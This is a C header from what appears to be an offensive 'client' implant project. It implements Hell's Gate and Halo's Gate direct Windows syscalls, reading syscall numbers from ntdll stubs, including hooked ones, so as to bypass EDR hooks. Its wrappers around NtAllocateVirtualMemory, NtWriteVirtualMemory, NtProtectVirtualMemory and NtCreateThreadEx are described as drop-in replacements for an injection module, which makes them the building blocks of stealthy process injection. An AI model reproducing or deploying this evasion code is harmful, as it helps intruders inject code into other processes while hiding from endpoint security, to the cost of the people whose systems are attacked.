/*
 * client/syscall.h  –  Direct syscall invocation (Hell's Gate + Halo's Gate)
 * ============================================================================
 * Extracts Windows syscall numbers (SSNs) from ntdll stubs at runtime and
 * invokes them directly via the `syscall` instruction — completely bypassing
 * the ntdll layer and any EDR hooks placed there.
 *
 * Hell's Gate (plain):
 *   Read the `mov eax, <SSN>` at offset +4 of the ntdll stub.
 *   Layout of an unhooked x64 stub:
 *     [+0]  4C 8B D1        mov  r10, rcx
 *     [+3]  B8 XX XX XX XX  mov  eax, <SSN>   ← read 4 bytes here
 *     [+8]  F6 04 25 ...    test [SharedUserData+0x308], 1
 *     [+F]  75 03           jnz  +3
 *     [+11] 0F 05           syscall
 *     [+13] C3              ret
 *
 * Halo's Gate (hooked stubs):
 *   If byte[0] == 0xE9 (JMP — hook installed), the SSN cannot be read
 *   directly.  Instead scan neighbouring stubs at ±32-byte intervals.
 *   Adjacent stubs have consecutive SSNs, so:
 *     SSN[target] = SSN[neighbour] ± delta
 *
 * Usage:
 *   1. Call sc_init() once at startup (after unhook_ntdll if used).
 *   2. Call SC_CALL(SyscallId, args...) — the variadic macro selects the
 *      right trampoline arity and invokes the syscall directly.
 *
 * Supported syscall IDs (add more as needed):
 *   SC_NtAllocateVirtualMemory
 *   SC_NtWriteVirtualMemory
 *   SC_NtProtectVirtualMemory
 *   SC_NtCreateThreadEx
 *   SC_NtClose
 *   SC_NtReadVirtualMemory
 *   SC_NtWriteVirtualMemory_Self   (alias, same SSN)
 */

#pragma once
#ifndef CLIENT_SYSCALL_H
#define CLIENT_SYSCALL_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ── Syscall slot IDs ───────────────────────────────────────────────────── */
typedef enum _SC_ID {
    SSN_NtAllocateVirtualMemory  = 0,
    SSN_NtWriteVirtualMemory     = 1,
    SSN_NtProtectVirtualMemory   = 2,
    SSN_NtCreateThreadEx         = 3,
    SSN_NtClose                  = 4,
    SSN_NtReadVirtualMemory      = 5,
    SC_COUNT                     = 6
} SC_ID;

/* ── Public API ─────────────────────────────────────────────────────────── */

/*
 * sc_init
 * -------
 * Resolves syscall numbers for all SC_ID slots using Hell's Gate / Halo's Gate.
 * Must be called once at startup, after unhook_ntdll() so that restored stubs
 * are available for direct reading.
 *
 * Returns TRUE if every SSN was resolved, FALSE if any failed.
 */
BOOL sc_init(void);

/*
 * sc_get_ssn
 * ----------
 * Returns the resolved syscall number for `id`, or 0xFFFFFFFF if not resolved.
 */
DWORD sc_get_ssn(SC_ID id);

/*
 * sc_ready
 * --------
 * Returns TRUE if sc_init() completed successfully.
 */
BOOL sc_ready(void);

/* ── Syscall trampolines (x64 only) ─────────────────────────────────────── */
/*
 * Each trampoline:
 *   1. Loads the SSN into eax
 *   2. Moves rcx → r10  (Windows syscall calling convention)
 *   3. Executes `syscall`
 *   4. Returns
 *
 * The trampolines are emitted in syscall.c as naked asm functions.
 * We declare them here with a generic prototype; callers cast appropriately.
 *
 * sc_syscall4  — 4 arguments
 * sc_syscall5  — 5 arguments
 * sc_syscall6  — 6 arguments
 * sc_syscall11 — 11 arguments (NtCreateThreadEx)
 *
 * All follow the x64 Windows ABI (rcx, rdx, r8, r9, stack...).
 * The SSN is passed as the FIRST argument (slot 0 = rcx on entry), so the
 * trampolines shift args:
 *   sc_syscall4(ssn, a1, a2, a3, a4)
 *       → syscall with rax=ssn, r10=a1, rdx=a2, r8=a3, r9=a4
 */
NTSTATUS sc_syscall4 (DWORD ssn, ...);
NTSTATUS sc_syscall5 (DWORD ssn, ...);
NTSTATUS sc_syscall6 (DWORD ssn, ...);
NTSTATUS sc_syscall11(DWORD ssn, ...);

/* ── Convenience wrappers ───────────────────────────────────────────────── */
/*
 * These mirror the Nt* function signatures exactly and route through
 * the direct-syscall trampolines.  Drop-in replacements for the
 * GetProcAddress-resolved pointers in inject.c.
 */

static inline NTSTATUS
SC_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                            ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                            ULONG AllocationType, ULONG Protect)
{
    return sc_syscall6(sc_get_ssn(SSN_NtAllocateVirtualMemory),
                       ProcessHandle, BaseAddress, ZeroBits,
                       RegionSize, AllocationType, Protect);
}

static inline NTSTATUS
SC_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                         PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                         PSIZE_T NumberOfBytesWritten)
{
    return sc_syscall5(sc_get_ssn(SSN_NtWriteVirtualMemory),
                       ProcessHandle, BaseAddress, Buffer,
                       NumberOfBytesToWrite, NumberOfBytesWritten);
}

static inline NTSTATUS
SC_NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                        PVOID Buffer, SIZE_T NumberOfBytesToRead,
                        PSIZE_T NumberOfBytesRead)
{
    return sc_syscall5(sc_get_ssn(SSN_NtReadVirtualMemory),
                       ProcessHandle, BaseAddress, Buffer,
                       NumberOfBytesToRead, NumberOfBytesRead);
}

static inline NTSTATUS
SC_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                           PSIZE_T NumberOfBytesToProtect,
                           ULONG NewAccessProtection, PULONG OldAccessProtection)
{
    return sc_syscall5(sc_get_ssn(SSN_NtProtectVirtualMemory),
                       ProcessHandle, BaseAddress, NumberOfBytesToProtect,
                       NewAccessProtection, OldAccessProtection);
}

static inline NTSTATUS
SC_NtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess,
                    PVOID ObjectAttributes, HANDLE ProcessHandle,
                    PVOID lpStartAddress, PVOID lpParameter,
                    ULONG Flags, SIZE_T StackZeroBits,
                    SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve,
                    PVOID lpBytesBuffer)
{
    return sc_syscall11(sc_get_ssn(SSN_NtCreateThreadEx),
                        hThread, DesiredAccess, ObjectAttributes,
                        ProcessHandle, lpStartAddress, lpParameter,
                        Flags, StackZeroBits, SizeOfStackCommit,
                        SizeOfStackReserve, lpBytesBuffer);
}

static inline NTSTATUS
SC_NtClose(HANDLE Handle)
{
    return sc_syscall4(sc_get_ssn(SSN_NtClose), Handle, 0, 0, 0);
}

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_SYSCALL_H */
